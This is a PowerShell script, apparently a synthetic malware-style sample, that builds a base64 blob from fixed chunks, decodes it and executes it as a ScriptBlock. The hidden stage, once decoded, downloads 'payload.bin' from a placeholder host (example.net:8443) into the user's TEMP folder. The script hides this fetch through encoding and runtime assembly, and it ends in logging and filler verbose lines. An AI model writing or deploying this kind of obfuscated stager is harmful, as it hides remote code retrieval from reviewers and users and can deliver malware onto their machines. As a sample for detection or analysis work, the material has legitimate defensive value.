<#
.SYNOPSIS
    Chunked encoded-stage workflow.

.DESCRIPTION
    Assembles a base64 command from several fixed chunks, decodes
    the result into a PowerShell string and passes it to the
    stage invoker with bounded error handling.

.NOTES
    The stage body is assembled at runtime.
#>
[CmdletBinding()]
param(
    [string]$TracePath = "$env:TEMP\transfer.log",
    [int]$TimeoutSec = 89
)
$ErrorActionPreference = "Stop"

# Decoder
function Expand-EncodedStage {
    [CmdletBinding()]
    param(
        [string]$EncodedText = ""
    )

    Write-Verbose ("Decoding " + $EncodedText.Length + " base64 characters")
    $StageBytes = [Convert]::FromBase64String($EncodedText)
    return [Text.Encoding]::Unicode.GetString($StageBytes)
}

# Invoker
function Invoke-EncodedStage {
    [CmdletBinding()]
    param(
        [string]$StageText = ''
    )

    if ([string]::IsNullOrWhiteSpace($StageText)) {
        throw "Decoded stage is empty"
    }
    $ScriptBlock = [ScriptBlock]::Create($StageText)
    return $ScriptBlock.Invoke()
}

$EncodedStage = (
    "JABTAHQAYQBnAGUAMgBVAHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHgAYQBtAHAAbABl" +
    'AC4AbgBlAHQAOgA4ADQANAAzAC8AZABvAHcAbgBsAG8AYQBkAHMALwBwAGEAeQBsAG8AYQBkAC4A' +
    'YgBpAG4AIgA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAg' +
    "ACQAUwB0AGEAZwBlADIAVQByAGwAIAAtAE8AdQB0AEYAaQBsAGUAIAAiACQAZQBuAHYAOgBUAEUA" +
    "TQBQAFwAcwB0AGEAZwBlADIALgBiAGkAbgAiACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBp" +
    'AG4AZwA='
)

try {
    Write-Verbose "Starting encoded-stage workflow"
    if (-not [string]::IsNullOrWhiteSpace($EncodedStage)) {
    $PayloadText = Expand-EncodedStage -EncodedText $EncodedStage
    $ResultObject = Invoke-EncodedStage -StageText $PayloadText
    }
    else {
        Write-Warning "Encoded stage blob is empty"
    }
}
catch {
    Write-Warning "Encoded workflow failed: $($_.Exception.Message)"
}

$EncodedReport = [ordered]@{
    Stage = "encoded"
    BlobLength = $EncodedStage.Length
    TimeoutSec = $TimeoutSec
}
$EncodedReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Preparing working directory"
Write-Verbose "Reading configuration values"
Write-Verbose "Retry budget remaining"
Write-Verbose "Stage handoff finished"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Checking local path"
Write-Verbose "Starting workflow"
Write-Verbose "Resolving configured target"
Write-Output "stage 26 initialized"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
